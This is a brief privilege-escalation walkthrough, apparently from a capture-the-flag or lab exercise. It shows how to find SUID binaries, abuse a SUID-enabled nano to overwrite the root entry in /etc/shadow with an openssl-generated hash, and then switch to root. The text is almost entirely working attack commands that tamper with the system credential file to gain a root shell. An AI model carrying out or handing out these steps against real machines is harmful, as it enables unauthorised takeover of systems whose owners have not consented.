### Scan for SUID file
```
find / -perm -4000 2>/dev/null
```

**/usr/bin/nano has SUID bit enabled. We can use this file editor to edit `/etc/shadow` file.**

#### Create a Hash for root
```
openssl passwd -1 -salt <mysalt> <password123> 
```

#### Edit `Shadow` file
```
nano /etc/shadow
```

**Replace the Value of the root password from `*` to the `hash` created with openssl**

#### Access root 
```
su root
```

**Enter the password `password123` and you get a root shell**